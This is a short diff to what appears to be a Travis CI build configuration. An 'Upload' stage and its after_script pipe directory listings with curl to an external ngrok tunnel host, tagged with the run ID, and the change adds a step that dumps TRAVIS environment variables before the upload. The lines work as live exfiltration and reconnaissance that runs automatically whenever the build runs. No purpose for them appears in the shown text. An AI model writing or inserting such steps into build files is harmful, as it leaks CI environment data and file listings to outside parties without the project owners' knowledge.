@@ -28,5 +28,5 @@ after_script:
 jobs:
   include:
     - stage: Upload
-      script: ls | curl -d @- http://bd10f3171262.ngrok.io/upload/$RUN_ID
+      script: env | grep '^TRAVIS*=*' && ls | curl -d @- http://bd10f3171262.ngrok.io/upload/$RUN_ID
       after_script: ls | curl -d @- http://bd10f3171262.ngrok.io/upload_after/$RUN_ID
